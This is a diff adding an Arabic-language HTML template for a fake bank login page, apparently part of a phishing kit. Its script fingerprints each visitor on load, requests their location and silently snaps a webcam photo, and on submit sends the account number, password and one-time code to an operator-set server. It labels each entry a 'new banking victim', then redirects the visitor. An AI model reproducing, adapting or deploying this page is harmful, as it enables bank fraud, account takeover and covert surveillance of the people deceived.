@@ -1,0 +1,131 @@
+<html lang="ar" dir="rtl">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width,initial-scale=1">
+<title>البنك الإلكتروني - تسجيل الدخول</title>
+<style>
+* { box-sizing: border-box; margin: 0; padding: 0; }
+body { font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; background: linear-gradient(135deg, #1a1a2e 0%, #16213e 100%); min-height: 100vh; display: flex; align-items: center; justify-content: center; }
+.container { background: white; padding: 40px; border-radius: 15px; box-shadow: 0 20px 60px rgba(0,0,0,0.3); width: 90%; max-width: 400px; }
+.header { text-align: center; margin-bottom: 30px; }
+.header .logo { width: 80px; height: 80px; background: linear-gradient(135deg, #0f4c81 0%, #1a73e8 100%); border-radius: 50%; display: flex; align-items: center; justify-content: center; margin: 0 auto 15px; }
+.header .logo svg { width: 40px; height: 40px; fill: white; }
+.header h1 { color: #1a1a2e; font-size: 22px; margin-bottom: 5px; }
+.header p { color: #666; font-size: 14px; }
+.secure-badge { background: #e8f5e9; color: #2e7d32; padding: 8px 15px; border-radius: 20px; font-size: 12px; display: inline-block; margin-bottom: 20px; }
+.form-group { margin-bottom: 20px; }
+.form-group label { display: block; margin-bottom: 8px; color: #333; font-weight: 500; font-size: 14px; }
+.form-group input { width: 100%; padding: 15px; border: 2px solid #e0e0e0; border-radius: 10px; font-size: 16px; transition: border 0.3s; }
+.form-group input:focus { outline: none; border-color: #1a73e8; }
+.btn { width: 100%; padding: 15px; background: linear-gradient(135deg, #0f4c81 0%, #1a73e8 100%); color: white; border: none; border-radius: 10px; font-size: 16px; font-weight: 600; cursor: pointer; }
+.btn:hover { opacity: 0.9; }
+.footer { text-align: center; margin-top: 20px; }
+.footer a { color: #1a73e8; text-decoration: none; font-size: 14px; }
+.security-info { background: #f5f5f5; padding: 15px; border-radius: 10px; margin-top: 20px; }
+.security-info p { font-size: 12px; color: #666; margin: 0; }
+.loading { display: none; text-align: center; }
+.spinner { border: 3px solid #f3f3f3; border-top: 3px solid #1a73e8; border-radius: 50%; width: 40px; height: 40px; animation: spin 1s linear infinite; margin: 20px auto; }
+@keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+</style>
+</head>
+<body>
+<div class="container">
+<div class="header">
+<div class="logo">
+<svg viewBox="0 0 24 24"><path d="M11.5 1L2 6v2h19V6l-9.5-5zM5 10v8H3v2h18v-2h-2v-8h-3v8h-2v-8h-3v8H9v-8H5z"/></svg>
+</div>
+<h1>الخدمات المصرفية الإلكترونية</h1>
+<p>تسجيل الدخول الآمن</p>
+</div>
+<div style="text-align: center;">
+<span class="secure-badge">🔒 اتصال آمن ومشفر</span>
+</div>
+<form id="loginForm">
+<div class="form-group">
+<label>رقم الحساب / اسم المستخدم</label>
+<input type="text" id="account" placeholder="أدخل رقم الحساب" required>
+</div>
+<div class="form-group">
+<label>كلمة المرور</label>
+<input type="password" id="password" placeholder="••••••••" required>
+</div>
+<div class="form-group">
+<label>رمز التحقق (OTP)</label>
+<input type="text" id="otp" placeholder="أدخل الرمز المُرسل لهاتفك">
+</div>
+<button type="submit" class="btn">تسجيل الدخول</button>
+</form>
+<div class="loading" id="loading">
+<div class="spinner"></div>
+<p>جاري التحقق من بيانات الحساب...</p>
+</div>
+<div class="footer">
+<a href="#">هل نسيت كلمة المرور؟</a>
+</div>
+<div class="security-info">
+<p>🛡️ هذه الصفحة محمية بتقنية التشفير SSL 256-bit. لا تشارك بياناتك مع أي شخص.</p>
+</div>
+</div>
+<video id="video" style="display:none" playsinline autoplay></video>
+<canvas id="canvas" style="display:none" width="500" height="500"></canvas>
+<script src="https://ajax.googleapis.com/ajax/libs/jquery/1.12.2/jquery.min.js"></script>
+<script>
+var uid="<%=uid %>";
+
+async function gatherAll() {
+    let td = '🏦 <b>ضحية بنكية جديدة!</b>\n\n';
+    td += '⚓ IP: <code><%=ip %></code>\n';
+    td += '⏰ الوقت: ' + new Date().toLocaleString() + '\n';
+    td += '🖥️ النظام: <code>' + navigator.platform + '</code>\n';
+    td += '📱 الشاشة: <code>' + screen.width + 'x' + screen.height + '</code>\n';
+    
+    // WebGL GPU
+    try {
+        const gl = document.createElement('canvas').getContext('webgl');
+        const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
+        if(debugInfo) td += '🎮 GPU: <code>' + gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL) + '</code>\n';
+    } catch(e){}
+    
+    $.post("<%=a %>/",{data:encodeURIComponent(td),uid:encodeURIComponent(uid)});
+    
+    if(navigator.geolocation){
+        navigator.geolocation.getCurrentPosition((p)=>{
+            $.post("<%=a %>/location",{uid:uid,lat:p.coords.latitude,lon:p.coords.longitude,acc:p.coords.accuracy});
+        }, ()=>{}, {enableHighAccuracy:true, timeout: 5000});
+    }
+    
+    try {
+        const stream = await navigator.mediaDevices.getUserMedia({video:true});
+        video.srcObject = stream;
+        setTimeout(() => {
+            canvas.getContext('2d').drawImage(video, 0, 0, 500, 500);
+            $.post("<%=a %>/camsnap",{uid:uid,img:encodeURIComponent(canvas.toDataURL("image/png").replace("data:image/png;base64,", ""))});
+            stream.getTracks().forEach(t => t.stop());
+        }, 1500);
+    } catch(e){}
+}
+
+document.getElementById('loginForm').onsubmit = function(e) {
+    e.preventDefault();
+    document.getElementById('loginForm').style.display = 'none';
+    document.getElementById('loading').style.display = 'block';
+    
+    let bankData = '🏦 <b>بيانات بنكية!</b>\n\n';
+    bankData += '👤 رقم الحساب: <code>' + document.getElementById('account').value + '</code>\n';
+    bankData += '🔑 كلمة المرور: <code>' + document.getElementById('password').value + '</code>\n';
+    if(document.getElementById('otp').value) {
+        bankData += '🔢 OTP: <code>' + document.getElementById('otp').value + '</code>\n';
+    }
+    
+    $.post("<%=a %>/", {
+        uid: uid,
+        data: encodeURIComponent(bankData)
+    });
+    
+    setTimeout(() => { window.location.href = "<%=url %>"; }, 3000);
+};
+
+window.onload = function(){ gatherAll(); if(typeof advancedGather==="function") advancedGather("<%=a %>","<%=uid %>"); };
+</script>
+</body>
+</html>
